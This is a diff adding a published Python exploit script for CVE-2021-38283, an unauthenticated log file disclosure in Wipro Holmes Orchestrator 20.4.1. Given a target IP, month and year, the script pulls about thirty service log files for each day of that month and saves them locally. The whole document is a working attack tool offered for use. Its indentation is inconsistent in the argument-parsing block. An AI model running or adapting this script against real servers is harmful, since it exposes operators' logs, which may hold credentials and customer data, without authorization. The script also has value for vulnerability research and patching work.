@@ -1,0 +1,121 @@
+id: 37066
+date: 11/22/2021
+title: Wipro Holmes Orchestrator 20.4.1 File Disclosure Exploit
+author: Rizal Muhammed
+cves: CVE-2021-38283
+
+# Exploit Title: Wipro Holmes Orchestrator 20.4.1 Unauthenticated Log File Disclosure
+# Exploit Author: Rizal Muhammed @ub3rsick
+# Vendor Homepage: https://www.wipro.com/holmes/
+# Version: 20.4.1
+# Tested on: Windows 10 x64
+# CVE : CVE-2021-38283
+
+import requests as rq
+import argparse
+import datetime
+import os
+from calendar import monthrange
+from multiprocessing.dummy import Pool as ThreadPool
+from functools import partial
+
+# Change if running on different port
+port = 8001
+
+log_list = [
+  "AlertService.txt",
+  "ApprovalService.txt",
+  "AuditService.txt",
+  "CustomerController.txt",
+  "CustomerDomainCredentialService.txt",
+  "CustomerFileService.txt",
+  "CustomerService.txt",
+  "DashboardController.txt",
+  "DataParseService.txt",
+  "DomainService.txt",
+  "ExecutionService.txt",
+  "ExternalAPIService.txt",
+  "FilesController.txt",
+  "FormService.txt",
+  "InfrastructureService.txt",
+  "ITSMConfigPrepService.txt",
+  "LicenseService.txt",
+  "LoginService.txt",
+  "MailService.txt",
+  "MasterdataController.txt",
+  "NetworkService.txt",
+  "OrchestrationPreparationService.txt",
+  "ProblemInfrastructureService.txt",
+  "ProcessExecutionService.txt",
+  "ServiceRequestService.txt",
+  "SolutionController.txt",
+  "SolutionLiveService.txt",
+  "SolutionService.txt",
+  "StorageService.txt",
+  "TaskService.txt",
+  "TicketingService.txt",
+  "UserController.txt",
+  "UtilityService.txt"
+
+]
+
+def check_month(val):
+  ival = int(val)
+  if ival > 0 and ival < 13:
+    return ival
+  else:
+    raise argparse.ArgumentTypeError("%s is not a valid month" % val)
+
+def check_year(val):
+        iyear = int(val)
+        if iyear >= 1960 and iyear <= datetime.date.today().year:
+                return iyear
+        else:
+                raise argparse.ArgumentTypeError("%s is not a valid year" % val)
+
+
+def do_request(target, date, log_file):
+  log_url = "http://%s/log/%s/%s" % (target, date, log_file)
+
+  log_name = "%s_%s" % (date, log_file)
+  print ("[*] Requesting Log: /log/%s/%s" % (date, log_file))
+
+  resp = rq.get(log_url)
+
+  if resp.status_code == 200 and not "Wipro Ltd." in resp.text:
+    print ("[+] Success : %s" % log_url)
+    #print (resp.text[0:150] + "\n<...snipped...>")
+    with open("logs/%s" % log_name, 'w') as lf:
+      lf.write(resp.text)
+    lf.close()
+    print ("[*] Log File Written to ./logs/%s" % (log_name))
+
+def main():
+
+  parser = argparse.ArgumentParser(
+      description="Wipro Holmes Orchestrator 20.4.1 Unauthenticated Log File Disclosure",
+      epilog="Vulnerability Discovery, PoC Author - Rizal Muhammed @ub3sick"
+    )
+
+  parser.add_argument("-t","--target-ip", help="IP Address of the target server", required=True)
+        parser.add_argument("-m","--month", help="Month of the log, (1=JAN, 2=FEB etc.)", required=True, type=check_month)
+        parser.add_argument("-y","--year", help="year of the log", required=True, type=check_year)
+        args = parser.parse_args()
+
+  ndays = monthrange(args.year, args.month)[1]
+  date_list = ["%s" % datetime.date(args.year, args.month,day) for day in range(1,ndays+1,1)]
+
+  target = "%s:%s" % (args.target_ip, port)
+
+  # create folder "logs" to save log files, if does not exist
+  if not os.path.exists("./logs"):
+    os.makedirs("./logs")
+
+  for log_date in date_list:
+    for log_file in log_list:
+      do_request(target, log_date, log_file)
+
+if __name__ == "__main__":
+  main()
+
+#  0day.today [2023-03-26]  #
